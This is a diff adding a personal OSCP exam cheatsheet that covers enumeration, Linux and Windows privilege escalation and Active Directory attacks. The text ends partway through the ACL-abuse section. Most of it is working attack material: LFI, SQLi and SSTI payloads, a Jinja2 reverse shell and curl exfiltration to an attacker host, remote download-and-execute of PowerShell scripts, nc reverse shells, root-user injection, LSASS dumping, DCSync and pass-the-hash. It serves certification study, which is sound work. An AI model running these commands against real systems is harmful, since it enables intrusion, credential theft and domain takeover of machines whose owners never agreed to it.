@@ -1,1 +1,1597 @@
 
+# 1337 Pete's OSCP Exam Cheatsheet (2026 Edition)
+
+> **PEN-200 | 3 Standalones + 1 AD Set (3 boxes) | 70/100 to pass**
+> **AD Set = ASSUMED BREACH — creds provided at start**
+> **Personal preference: Burp Suite over curl where it makes sense**
+
+---
+
+## TABLE OF CONTENTS
+
+1. [Exam Strategy & Point Math](#1-exam-strategy--point-math)
+2. [Day-0 Setup & Workspace](#2-day-0-setup--workspace)
+3. [Universal Enumeration](#3-universal-enumeration)
+4. [Linux Standalone Methodology](#4-linux-standalone-methodology)
+5. [Windows Standalone Methodology](#5-windows-standalone-methodology)
+6. [Active Directory Attack Chains](#6-active-directory-attack-chains)
+7. [MSSQL — RCE & Lateral Movement](#7-mssql--rce--lateral-movement)
+8. [Pivoting — Ligolo-ng + Chisel](#8-pivoting--ligolo-ng--chisel)
+9. [Password Attacks & Hashes](#9-password-attacks--hashes)
+10. [File Transfers](#10-file-transfers)
+11. [Shells & TTY Upgrades](#11-shells--tty-upgrades)
+12. [High-Value CVEs](#12-high-value-cves)
+13. [Proof Collection Format](#13-proof-collection-format)
+14. [Stuck? Reset Checklist](#14-stuck-reset-checklist)
+15. [Rabbit Holes To Avoid](#15-rabbit-holes-to-avoid)
+
+---
+
+## 1. EXAM STRATEGY & POINT MATH
+
+```
+AD Set (3 machines):        40 pts
+  ├─ MS01 (entry, creds):   10 pts → local.txt
+  ├─ MS02 (pivot):          10 pts → local.txt
+  └─ DC01:                  20 pts → proof.txt   (DA required)
+Standalone × 3 boxes:       60 pts (10 local + 10 proof each)
+─────────────────────────────────────
+TOTAL: 100  |  PASS: 70
+```
+
+**Realistic pass paths**
+
+| Scenario | Plan |
+|---|---|
+| **A (best)** | Full AD (40) + 2 full standalones (40) = **80** |
+| **B** | Full AD (40) + 1 full standalone (20) + 1 local.txt (10) = **70** |
+| **C** | Full AD (40) + 3 local.txts (30) = **70** |
+| **D (no AD)** | 3 full standalones (60) + AD partial (10) = **70** |
+
+### Time Plan (23h45m)
+
+```
+0:00–0:30   Setup, /etc/hosts, parallel nmap on ALL targets
+0:30–4:00   AD SET FIRST — 40 pts guaranteed path
+4:00–8:00   Standalone #1 (easiest from nmap)
+8:00–13:00  Standalone #2
+13:00–18:00 Standalone #3
+18:00–22:00 Revisit stuck boxes
+22:00–23:00 Final screenshots, verify ALL proofs readable
+```
+
+### Metasploit Rule
+- `msfvenom` → free use on every box (payload generation only)
+- Metasploit modules / `use exploit/...` → **EXACTLY 1 machine**
+- Manual exploits everywhere else
+
+---
+
+## 2. DAY-0 SETUP & WORKSPACE
+
+```bash
+# Create exam workspace
+mkdir -p ~/exam/{ad/{ms01,ms02,dc},box1,box2,box3}/{scans,loot,exploits,screenshots}
+cd ~/exam
+
+# Tools sanity check (verify before exam)
+which nxc netexec evil-winrm crackmapexec
+ls ~/oscp/tools/chisel ~/oscp/tools/ligolo
+ls ~/oscp/tools/PEAS/ ~/oscp/tools/impacket/
+
+# Confirm tool versions (do this NIGHT BEFORE exam, not day of)
+./chisel-linux --version              # Should be 1.11.5
+./proxy -version                      # Ligolo 0.8.2
+
+# /etc/hosts template — fill in as you discover hostnames
+sudo tee -a /etc/hosts <<EOF
+# Exam targets
+# 192.168.x.100   dc01 dc01.corp.local corp.local
+# 192.168.x.101   ms01 ms01.corp.local
+# 10.10.10.50     ms02 ms02.corp.local
+EOF
+
+# Tmux layout — one window per machine, split panes for nmap/shell/notes
+tmux new -s exam
+# Ctrl-b c (new window) | Ctrl-b % (vsplit) | Ctrl-b " (hsplit)
+```
+
+### Critical day-0 reminders
+- Flameshot ready: `flameshot gui` (every flag = screenshot of `cat proof.txt && whoami && hostname && ip a`)
+- AD creds **first thing into notes** — copy/paste exact case
+- Don't forget UDP scans
+- Write your point tracker on paper
+
+---
+
+## 3. UNIVERSAL ENUMERATION
+
+### Parallel scans — fire on every IP immediately
+
+```bash
+# Quick triage (run in parallel across all targets)
+for ip in $TARGETS; do
+  nmap -sV --open -T4 $ip -oN scans/quick_$ip.txt &
+done; wait
+
+# Full TCP — let this run while you work other boxes
+nmap -p- -sV -sC --open -T4 -oN scans/full_$IP.txt $IP
+
+# UDP top 20 — DO NOT SKIP (SNMP/TFTP often have keys to the kingdom)
+sudo nmap -sU --top-ports 20 -oN scans/udp_$IP.txt $IP
+
+# If you find anything interesting, follow up with vuln scripts:
+nmap --script "vuln and safe" -p $PORTS $IP -oN scans/vuln_$IP.txt
+```
+
+### Port → Action Quick Reference
+
+```
+21    FTP      → anonymous:anonymous | banner → searchsploit
+22    SSH      → version banner, hold for creds later
+25    SMTP    → smtp-user-enum -M VRFY -U users.txt -t $IP
+53    DNS     → dig axfr @$IP <domain>
+80/443         → see Web section below
+88    Kerberos → AD confirmed → AS-REP roast users
+111   RPC/NFS  → showmount -e $IP
+135   MSRPC    → rpcclient -U "" -N $IP
+139/445 SMB    → see SMB section
+161 UDP SNMP   → onesixtyone, snmpwalk
+389   LDAP    → ldapsearch anonymous + with creds
+636   LDAPS   → same, over TLS
+1433  MSSQL   → see MSSQL section
+3306  MySQL   → mysql -u root -h $IP (try blank)
+3389  RDP     → check BlueKeep, hold for creds
+5985  WinRM   → evil-winrm -i $IP -u U -p P
+5986  WinRM-S → evil-winrm -i $IP -u U -p P -S
+8080  alt-HTTP → Tomcat /manager, Jenkins, Weblogic
+```
+
+### Web — full workflow (use Burp as your hub)
+
+```bash
+# 1. Fingerprint
+whatweb -v http://$IP
+curl -sI http://$IP
+
+# 2. Pipe everything through Burp proxy where useful
+#    Burp listening on 127.0.0.1:8080 → set scope on $IP
+
+# 3. Directory busting (let these run, work in Burp meanwhile)
+feroxbuster -u http://$IP \
+  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
+  -x php,html,txt,aspx,jsp -t 50 --depth 2 -o ferox.txt
+
+gobuster dir -u http://$IP \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
+  -x php,html,txt,asp,aspx,jsp -t 50 -o gobuster.txt
+
+# 4. Hand-check the obvious — feed each through Burp Repeater
+#    /robots.txt /sitemap.xml /.git/HEAD /.env /.htaccess
+#    /backup/ /admin/ /api/ /test/ /dev/ /old/
+#    view-source: for HTML comments — DEVS LEAVE CREDS HERE
+
+# 5. VHost fuzzing (when domain is known)
+ffuf -u http://$DOMAIN -H "Host: FUZZ.$DOMAIN" \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+  -fs <baseline-size>
+
+# 6. CMS-specific
+wpscan --url http://$IP --enumerate u,p,t,vp --plugins-detection aggressive
+joomscan -u http://$IP
+droopescan scan drupal -u http://$IP
+
+# 7. Parameter fuzzing in Burp Intruder OR ffuf
+ffuf -u "http://$IP/page.php?FUZZ=test" \
+  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
+  -fs 0 -mc 200,301,302,500
+```
+
+### SMB enumeration
+
+```bash
+# Unauthenticated
+smbclient -L //$IP -N
+smbmap -H $IP -u '' -p ''
+nxc smb $IP -u '' -p '' --shares
+nxc smb $IP -u 'guest' -p '' --shares
+nxc smb $IP -u 'anonymous' -p '' --shares
+
+# Vuln scan
+nmap --script "smb-vuln-*" -p 445 $IP
+nmap --script smb-vuln-ms17-010 -p 445 $IP
+
+# Authenticated (the moment you have creds)
+nxc smb $IP -u $USER -p $PASS --shares --users --groups --pass-pol --loggedon-users
+smbmap -H $IP -u $USER -p $PASS -R
+smbclient //$IP/$SHARE -U "$USER%$PASS"
+
+# Recursive download
+smbclient //$IP/SHARE -U "$USER%$PASS" -c 'recurse ON; prompt OFF; mget *'
+
+# Spider for juicy stuff
+nxc smb $IP -u $USER -p $PASS -M spider_plus
+```
+
+### SNMP enumeration
+
+```bash
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $IP
+snmpwalk -c public -v1 $IP
+snmpwalk -c public -v2c $IP 1.3.6.1.2.1.25.4.2.1.2     # processes
+snmpwalk -c public -v2c $IP 1.3.6.1.2.1.25.6.3.1.2     # software
+snmpwalk -c public -v2c $IP 1.3.6.1.4.1.77.1.2.25      # Windows users
+snmp-check $IP -c public
+```
+
+---
+
+## 4. LINUX STANDALONE METHODOLOGY
+
+### Initial access decision tree
+
+```
+WEB (80/443/8080)?
+├─ Dirbusting → /admin, /backup, /upload, /dev, /api?
+├─ CMS? → wpscan/joomscan → plugin CVE
+├─ Login form → default creds, SQLi, brute (only after rest)
+├─ File upload → bypass → webshell
+├─ LFI → /proc/self/environ or log poisoning → RCE
+├─ SSTI → {{7*7}} test → Jinja2/Twig RCE
+├─ SQLi → UNION read, OUTFILE write
+└─ Cmd injection → ; | ` $() %0a
+FTP (21)?
+├─ anonymous → writable + overlaps webroot? → upload PHP shell
+NFS (111/2049)?
+├─ showmount -e → mount → look for .ssh, configs, writable dirs
+└─ no_root_squash? → see privesc
+SNMP (161/udp)?
+└─ community string → users/processes/configs
+SSH (22)?
+└─ Hold — need creds from elsewhere first
+```
+
+### Web attack payloads (paste into Burp Repeater)
+
+```
+# ── LFI ──────────────────────────────────────────────────
+?file=../../../../../../etc/passwd
+?file=../../../../../../etc/shadow
+?file=/proc/self/environ
+?file=/proc/self/cmdline
+?file=/proc/self/fd/0..255          # file descriptors
+?file=php://filter/convert.base64-encode/resource=index
+# Decode: echo '<b64>' | base64 -d
+
+# Data wrapper RCE (when allow_url_include=on)
+?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
+&cmd=id
+
+# Log poisoning (LFI + writable log)
+# 1) Burp Repeater: change User-Agent to <?php system($_GET["c"]); ?>
+# 2) Trigger: ?file=/var/log/apache2/access.log&c=id
+# Log paths to try:
+#   /var/log/apache2/access.log /var/log/nginx/access.log
+#   /var/log/auth.log /var/log/vsftpd.log /var/log/mail.log
+
+# SSH log poisoning
+ssh '<?php system($_GET["c"]); ?>'@$IP
+# Then LFI /var/log/auth.log&c=id
+
+# ── SQL Injection ────────────────────────────────────────
+' OR '1'='1'-- -
+" OR "1"="1"-- -
+' UNION SELECT 1,load_file('/etc/passwd'),3-- -
+' UNION SELECT 1,"<?php system($_GET['c']);?>",3 INTO OUTFILE '/var/www/html/s.php'-- -
+
+# sqlmap (after manual testing confirms)
+sqlmap -u "http://$IP/page.php?id=1" --batch --dbs
+sqlmap -u "http://$IP/page.php?id=1" --batch --os-shell
+sqlmap -r request.txt --batch --level=5 --risk=3       # saved Burp request
+
+# ── File upload bypasses (try in this order in Burp) ─────
+# 1) MIME spoof: Content-Type: image/jpeg
+# 2) Magic bytes: prepend GIF89a;<?php ...?>
+# 3) Double-ext: shell.php.jpg, shell.jpg.php
+# 4) Case: .pHp .PHP
+# 5) Alt-ext: .phtml .phar .php5 .php7 .pht .inc
+# 6) Null byte (old PHP): shell.php%00.gif
+# 7) Path traversal in filename: ../../../shell.php
+
+# ── SSTI ─────────────────────────────────────────────────
+# Detect:  {{7*7}}=49 Jinja2/Twig   ${7*7}=49 FreeMarker/Mako
+# Jinja2:
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+# Jinja2 revshell:
+{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/LHOST/4444 0>&1"').read()}}
+# Twig:
+{{['id']|filter('system')}}
+
+# ── Cmd injection ────────────────────────────────────────
+;id    |id    `id`    $(id)    %0aid    %0d%0aid    &&id    ||id
+# Blind/OOB:
+;curl http://LHOST/$(id|base64 -w0)
+```
+
+### Linux privesc — actual order to run
+
+```bash
+# === STEP 0: stabilize shell first (see section 11) ===
+
+# === STEP 1: linpeas (run in background while you do manual) ===
+# Attacker:
+cd ~/oscp/tools/PEAS && python3 -m http.server 80
+# Victim:
+curl -s http://LHOST/linpeas.sh | bash 2>/dev/null | tee /tmp/lp.out
+
+# === STEP 2: manual — fast wins first ===
+sudo -l                                       # 80% of CTF root paths
+# NOPASSWD result? → gtfobins.github.io IMMEDIATELY
+# Common quick wins:
+#   sudo find . -exec /bin/bash \; -p
+#   sudo python3 -c 'import os; os.system("/bin/bash")'
+#   sudo vim -c ':!/bin/bash'
+#   sudo awk 'BEGIN{system("/bin/bash")}'
+#   sudo env /bin/bash
+#   sudo less /etc/profile  →  !/bin/bash
+
+# LD_PRELOAD if env_keep set:
+cat > /tmp/p.c <<EOF
+#include <stdio.h>
+#include <stdlib.h>
+void _init(){ setgid(0); setuid(0); system("/bin/bash -p"); }
+EOF
+gcc -fPIC -shared -nostartfiles -o /tmp/p.so /tmp/p.c
+sudo LD_PRELOAD=/tmp/p.so <allowed_binary>
+
+# === STEP 3: SUID / capabilities ===
+find / -perm -4000 -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+getcap -r / 2>/dev/null
+# Each → gtfobins.github.io
+# Common wins:
+# /usr/bin/python3 with cap_setuid:
+python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
+
+# === STEP 4: Cron + writable + wildcard ===
+cat /etc/crontab
+ls -la /etc/cron.*
+cat /var/spool/cron/crontabs/* 2>/dev/null
+# Wildcard injection (tar in cron):
+cd <writable-dir>
+echo 'bash -i >& /dev/tcp/LHOST/4444 0>&1' > shell.sh
+chmod +x shell.sh
+touch -- '--checkpoint=1'
+touch -- '--checkpoint-action=exec=sh shell.sh'
+
+# === STEP 5: writable files ===
+ls -la /etc/passwd /etc/shadow /etc/sudoers
+find / -writable -not -path "/proc/*" -not -path "/sys/*" -type f 2>/dev/null | head
+# /etc/passwd writable:
+openssl passwd -1 -salt x pwn123       # generate hash
+echo 'pwn:$1$x$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
+su pwn
+
+# === STEP 6: NFS no_root_squash ===
+cat /etc/exports
+# Attacker side:
+mount -t nfs $IP:/share /mnt/x
+cp /bin/bash /mnt/x/ && chmod +s /mnt/x/bash
+# Victim:
+/path/to/bash -p
+
+# === STEP 7: Docker / LXD / disk group ===
+id | grep -E "docker|lxd|disk"
+# docker group → instant root:
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+# lxd group:  use alpine builder → privileged container with / mounted
+# disk group:  debugfs /dev/sda → access /
+
+# === STEP 8: PATH hijacking ===
+strings <suid-or-root-script> | grep -v "^/"     # unqualified binary?
+echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/<name>
+chmod +x /tmp/<name>
+export PATH=/tmp:$PATH
+# trigger the script
+
+# === STEP 9: interesting files ===
+find / \( -name "*.kdbx" -o -name "id_rsa" -o -name "*.bak" \
+   -o -name "*.conf" -o -name "*config*" \) 2>/dev/null | grep -v proc
+grep -rEi 'pass(word)?|secret|api[_-]?key|token' \
+   /var/www /opt /home /etc 2>/dev/null | grep -v '\.pyc'
+cat ~/.bash_history /home/*/.bash_history /root/.bash_history 2>/dev/null
+
+# === STEP 10: kernel (last resort) ===
+uname -r
+searchsploit linux kernel $(uname -r | cut -d- -f1)
+# DirtyCow 2016-5195 (kernel<4.8.3)
+# DirtyPipe 2022-0847 (kernel 5.8–5.16.11)
+# PwnKit 2021-4034 (pkexec, almost universal)
+```
+
+### Linux privesc decision tree (memorize)
+
+```
+sudo -l NOPASSWD?         → gtfobins → ROOT ✓
+SUID listed in gtfobins?  → ROOT ✓
+Custom SUID?              → strings/ltrace → PATH hijack? → ROOT ✓
+cap_setuid?               → setuid(0) → ROOT ✓
+Cron writable script?     → append revshell → ROOT ✓
+Cron with wildcard?       → wildcard injection → ROOT ✓
+/etc/passwd writable?     → add root user → ROOT ✓
+NFS no_root_squash?       → SUID bash → ROOT ✓
+docker/lxd/disk group?    → group abuse → ROOT ✓
+Internal port (ss -tlnp)? → forward to attacker → exploit
+Nothing left?             → kernel exploit (verify version FIRST)
+```
+
+---
+
+## 5. WINDOWS STANDALONE METHODOLOGY
+
+### Initial access decision tree
+
+```
+SMB (445)?
+├─ null session → shares → grab files → search for creds
+├─ MS17-010 vulnerable? → EternalBlue → SYSTEM
+└─ Guest / found creds → psexec/wmiexec/smbexec
+Web?
+├─ Same payloads as Linux (LFI/SQLi/SSTI/upload)
+├─ IIS? → /aspnet_client, WebDAV (davtest/cadaver)
+└─ Tomcat? → /manager/html → WAR shell deploy
+MSSQL (1433)? → see Section 7
+WinRM (5985/5986)? → evil-winrm
+RDP (3389)? → BlueKeep on Win7/2008, otherwise hold for creds
+FTP (21)? → anon + writable + webroot overlap → ASPX shell
+```
+
+### Initial access commands
+
+```bash
+# MS17-010 EternalBlue
+nmap --script smb-vuln-ms17-010 -p 445 $IP
+# Manual: github.com/3ndG4me/AutoBlue-MS17-010
+# MSF (your one allowed box): use exploit/windows/smb/ms17_010_eternalblue
+
+# Tomcat WAR shell
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f war -o s.war
+curl -u tomcat:s3cret -T s.war "http://$IP:8080/manager/text/deploy?path=/s"
+curl http://$IP:8080/s/
+
+# WebDAV
+davtest -url http://$IP
+cadaver http://$IP
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f aspx -o s.aspx
+curl -T s.aspx http://$IP/uploads/s.aspx
+
+# WinRM
+evil-winrm -i $IP -u $USER -p "$PASS"
+evil-winrm -i $IP -u $USER -H $NTLM_HASH                # pass-the-hash
+evil-winrm -i $IP -u $USER -p "$PASS" -S                # over 5986/HTTPS
+
+# psexec/wmiexec (Impacket)
+impacket-psexec  $DOMAIN/$USER:'$PASS'@$IP
+impacket-wmiexec $DOMAIN/$USER:'$PASS'@$IP              # stealthier, no service
+impacket-smbexec $DOMAIN/$USER:'$PASS'@$IP              # no binary on disk
+# With hash:
+impacket-psexec  -hashes :$NTLM $DOMAIN/$USER@$IP
+```
+
+### Windows privesc
+
+```powershell
+# === Step 1: automated ===
+# Attacker:
+python3 -m http.server 80
+
+# Victim (PowerShell):
+IEX(New-Object Net.WebClient).DownloadString('http://LHOST/winPEAS.ps1')
+# Or .exe variant (download then run):
+iwr http://LHOST/winPEASany.exe -OutFile C:\Windows\Temp\wp.exe
+C:\Windows\Temp\wp.exe quiet > C:\Windows\Temp\out.txt
+
+# PowerUp checks (lightweight, fast)
+IEX(IWR http://LHOST/PowerUp.ps1 -UseBasicParsing); Invoke-AllChecks
+# Pete's note: pre-installed on Kali at /usr/share/windows-resources/powersploit/
+
+# === Step 2: context ===
+whoami /all                                # privileges + groups + SIDs
+systeminfo                                 # OS + patches
+wmic qfe list brief                        # installed hotfixes
+net user $env:USERNAME                     # group membership
+```
+
+### Token-priv exploitation (whoami /priv)
+
+```powershell
+# SeImpersonate / SeAssignPrimaryToken → potatoes
+.\GodPotato-NET4.exe -cmd "cmd /c whoami"
+.\GodPotato-NET4.exe -cmd "cmd /c net user pwn Pwn123! /add && net localgroup administrators pwn /add"
+.\PrintSpoofer64.exe -i -c "cmd /c whoami"
+.\PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe LHOST 4444 -e cmd"
+.\JuicyPotatoNG.exe -t * -p "C:\Windows\Temp\nc.exe" -a "LHOST 4444 -e cmd"
+
+# SeBackup / SeRestore → read SAM/SYSTEM hives
+reg save HKLM\SAM     C:\Temp\SAM
+reg save HKLM\SYSTEM  C:\Temp\SYSTEM
+reg save HKLM\SECURITY C:\Temp\SECURITY
+# Exfil, then on attacker:
+impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
+
+# SeDebug → dump LSASS
+procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp
+# Attacker:
+pypykatz lsa minidump lsass.dmp
+```
+
+### Service / Registry / Scheduled task abuse
+
+```cmd
+:: Unquoted service paths
+wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"
+
+:: Writable service binary
+.\accesschk.exe -uwcqv * /accepteula 2>nul | findstr "RW WD"
+:: Replace + restart:
+sc stop SVCNAME
+copy shell.exe "C:\Path\To\service.exe" /Y
+sc start SVCNAME
+
+:: Weak service ACL (change binpath)
+.\accesschk.exe -uwcqv "$env:USERNAME" * /accepteula
+sc config SVCNAME binpath= "cmd /c net localgroup administrators pwn /add"
+sc stop SVCNAME && sc start SVCNAME
+
+:: AlwaysInstallElevated (BOTH keys must = 1)
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+:: If both 0x1:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=4444 -f msi -o evil.msi
+msiexec /quiet /qn /i C:\Temp\evil.msi
+
+:: Autologon
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i "DefaultUserName DefaultPassword DefaultDomainName"
+
+:: Search registry for password strings
+reg query HKLM /f password /t REG_SZ /s 2>nul | findstr /i password
+reg query HKCU /f password /t REG_SZ /s 2>nul
+
+:: Stored credentials (runas with /savecred)
+cmdkey /list
+runas /savecred /user:DOMAIN\admin "C:\Temp\nc.exe LHOST 4444 -e cmd"
+```
+
+### Files to grep on every Windows box
+
+```cmd
+type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+type C:\inetpub\wwwroot\web.config
+type C:\xampp\passwords.txt
+type C:\Windows\Panther\unattend.xml
+type C:\Windows\System32\sysprep\sysprep.xml
+type C:\Windows\System32\sysprep.inf
+
+:: Recursive content search
+findstr /spin "password" C:\*.txt C:\*.xml C:\*.ini C:\*.config 2>nul
+dir /s /b C:\Users\ 2>nul | findstr /i "pass cred secret"
+
+:: KeePass / KDBX hunt
+dir /s /b C:\*.kdbx 2>nul
+```
+
+### Windows privesc decision tree
+
+```
+whoami /priv → SeImpersonate / SeAssignPrimaryToken → potato → SYSTEM ✓
+whoami /priv → SeBackup → reg save SAM/SYSTEM → secretsdump → PTH ✓
+whoami /priv → SeDebug → procdump lsass → pypykatz ✓
+Both AlwaysInstallElevated = 1 → msi → SYSTEM ✓
+Unquoted service + writable parent dir → drop binary → restart → SYSTEM ✓
+Writable service binary or weak ACL → swap/binpath → SYSTEM ✓
+cmdkey stored creds → runas /savecred → elevated shell ✓
+Autologon password in registry → reuse → ✓
+Scheduled task SYSTEM + writable script → modify → ✓
+PowerShell history with creds → reuse → ✓
+Nothing? → systeminfo → unpatched CVE
+```
+
+---
+
+## 6. ACTIVE DIRECTORY ATTACK CHAINS
+
+> **OSCP AD = assumed breach.** You get creds like `stephanie:Password123 / corp.local / DC: 192.168.x.100`. Enumerate immediately — do not waste time looking for foothold; you have one.
+
+### Full attack flow
+
+```
+PROVIDED CREDS
+   │
+   ▼
+[1] RAPID ENUM  →  BloodHound + nxc + LDAP + PowerView
+   │
+   ▼
+[2] QUICK WINS (parallel)
+   ├── AS-REP roast    ├── Kerberoast        ├── Description fields
+   ├── SYSVOL/GPP      ├── SMB share grep    └── Password spray (CAREFUL)
+   │
+   ▼
+[3] MS01 local.txt (10 pts) — get shell, privesc to admin
+   │
+   ▼
+[4] MS02 local.txt (10 pts) — pivot via Ligolo, lateral with found creds
+   │
+   ▼
+[5] ESCALATE — ACL abuse / DCSync / Delegation / GPO
+   │
+   ▼
+[6] DC proof.txt (20 pts) — DA → PSExec/WMIexec → grab flag → secretsdump
+```
+
+### Kerberos refresher (the high school analogy)
+
+```
+KDC = principal's office
+TGT = wristband ("you're a real student, signed by principal")
+ST  = hall pass for a specific room (CIFS, MSSQL, etc.)
+
+AS-REQ/REP: student asks principal for wristband, gets TGT
+TGS-REQ/REP: student presents wristband, asks for hall pass to room X
+AP-REQ: student shows hall pass at room X, gets in
+```
+
+### Phase 1 — Enumeration with provided creds
+
+```bash
+# BloodHound (FIRST THING — gives you the attack path visually)
+bloodhound-python -u stephanie -p 'Password123' \
+  -d corp.local -ns 192.168.x.100 -c All --zip
+# Drag ZIP into BloodHound GUI
+# Run these queries:
+#   Find Shortest Paths to Domain Admins
+#   Find All Kerberoastable Users
+#   Find AS-REP Roastable Users
+#   Find Principals with DCSync Rights
+#   Computers with Unconstrained Delegation
+#   Find Owned Principals → Shortest Path to DA
+
+# nxc (netexec) rapid recon
+nxc smb 192.168.x.100 -u stephanie -p 'Password123' --shares --users --groups --pass-pol
+nxc smb 192.168.x.100 -u stephanie -p 'Password123' --rid-brute
+nxc ldap 192.168.x.100 -u stephanie -p 'Password123' --asreproast asrep.txt
+nxc ldap 192.168.x.100 -u stephanie -p 'Password123' --kerberoasting kerb.txt
+nxc ldap 192.168.x.100 -u stephanie -p 'Password123' --trusted-for-delegation
+nxc ldap 192.168.x.100 -u stephanie -p 'Password123' --password-not-required
+
+# LDAP — find passwords in description fields (VERY COMMON in OSCP)
+ldapsearch -x -H ldap://192.168.x.100 \
+  -D "stephanie@corp.local" -w 'Password123' \
+  -b "DC=corp,DC=local" \
+  "(&(objectClass=user)(description=*))" sAMAccountName description
+
+# Kerbrute — user enumeration without password attempts (no lockout risk)
+kerbrute userenum -d corp.local --dc 192.168.x.100 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+
+# PowerView (from Windows victim)
+. .\PowerView.ps1
+# Or load remote:
+IEX(IWR http://LHOST/PowerView.ps1 -UseBasicParsing)
+
+Get-DomainUser -Properties samaccountname,description | ?{$_.description}
+Get-DomainGroupMember "Domain Admins" -Recurse
+Get-DomainComputer -OperatingSystem "*server*" | select name,operatingsystem,dnshostname
+Get-DomainGPO | select displayname,gpcfilesyspath
+Get-DomainTrust
+Find-DomainShare -CheckShareAccess
+Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match "Write|All|Force"}
+```
+
+### Phase 2 — Quick credential wins
+
+#### AS-REP Roasting (no pre-auth)
+
+```bash
+impacket-GetNPUsers corp.local/stephanie:'Password123' \
+  -dc-ip 192.168.x.100 -request -format hashcat -outputfile asrep.txt
+
+# Unauth check across user list
+impacket-GetNPUsers corp.local/ -usersfile users.txt \
+  -dc-ip 192.168.x.100 -no-pass -format hashcat
+
+# Crack
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 18200 asrep.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+```
+
+#### Kerberoasting (service accounts with SPNs)
+
+```bash
+impacket-GetUserSPNs corp.local/stephanie:'Password123' \
+  -dc-ip 192.168.x.100 -request -outputfile kerb.txt
+
+# From Windows
+.\Rubeus.exe kerberoast /format:hashcat /outfile:kerb.txt
+
+# Crack
+hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 13100 kerb.txt rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule
+```
+
+#### GPP / SYSVOL passwords (cpassword)
+
+```bash
+nxc smb 192.168.x.100 -u stephanie -p 'Password123' -M gpp_password
+nxc smb 192.168.x.100 -u stephanie -p 'Password123' -M gpp_autologin
+
+# Manual:
+smbclient //192.168.x.100/SYSVOL -U "corp.local/stephanie%Password123"
+# Find Groups.xml with cpassword=...
+gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
+```
+
+#### Password spray (mind the lockout!)
+
+```bash
+# ALWAYS check lockout policy first
+nxc smb 192.168.x.100 -u stephanie -p 'Password123' --pass-pol
+
+# Spray one password across all users (1 try per user per round, wait between rounds)
+kerbrute passwordspray -d corp.local --dc 192.168.x.100 users.txt 'Password123'
+kerbrute passwordspray -d corp.local --dc 192.168.x.100 users.txt 'Welcome2026!'
+
+# Common patterns to try (1 password per round):
+#   Password123  Welcome1  ChangeMe1
+#   <Season><Year>! e.g. Spring2026!  Summer2026!
+#   <CompanyName>1  <CompanyName>@123
+```
+
+### Phase 3/4 — Lateral movement
+
+#### Pass-the-Hash
+
+```bash
+# Verify hash works against target(s)
+nxc smb $IP -u Administrator -H $NTLM --local-auth
+nxc smb 10.10.10.0/24 -u Administrator -H $NTLM --local-auth --continue-on-success | grep "+"
+
+# Shell
+impacket-psexec  $DOMAIN/Administrator@$IP -hashes :$NTLM
+impacket-wmiexec $DOMAIN/Administrator@$IP -hashes :$NTLM     # stealthier
+impacket-smbexec $DOMAIN/Administrator@$IP -hashes :$NTLM     # no disk artifact
+evil-winrm -i $IP -u Administrator -H $NTLM
+```
+
+#### Pass-the-Ticket / Overpass-the-Hash
+
+```bash
+# Get TGT with NTLM hash (overpass)
+impacket-getTGT corp.local/user -hashes :$NTLM -dc-ip 192.168.x.100
+export KRB5CCNAME=user.ccache
+impacket-psexec -k -no-pass corp.local/user@$TARGET_FQDN     # MUST use FQDN
+
+# From Windows (Rubeus)
+.\Rubeus.exe asktgt /user:user /rc4:$NTLM /domain:corp.local /dc:192.168.x.100 /ptt
+.\Rubeus.exe triage                                          # list current tickets
+.\Rubeus.exe ptt /ticket:<BASE64>                            # inject ticket
+```
+
+### Phase 5 — Escalate to Domain Admin
+
+#### DCSync
+
+```bash
+# Linux
+impacket-secretsdump corp.local/user:'pass'@192.168.x.100 -just-dc
+impacket-secretsdump corp.local/user:'pass'@192.168.x.100 -just-dc-user krbtgt
+impacket-secretsdump corp.local/user:'pass'@192.168.x.100 -just-dc-user Administrator
+
+# Windows (mimikatz)
+privilege::debug
+lsadump::dcsync /user:krbtgt /domain:corp.local
+lsadump::dcsync /user:Administrator /domain:corp.local
+lsadump::dcsync /all /domain:corp.local
+```
+
+#### ACL abuse paths (follow BloodHound output)
+
+```powershell
+# GenericAll / GenericWrite on USER → force password reset
+$pass = ConvertTo-SecureString 'Pwn3d!' -AsPlainText -Force
+Set-DomainUserPassword -Identity target -AccountPassword $pass
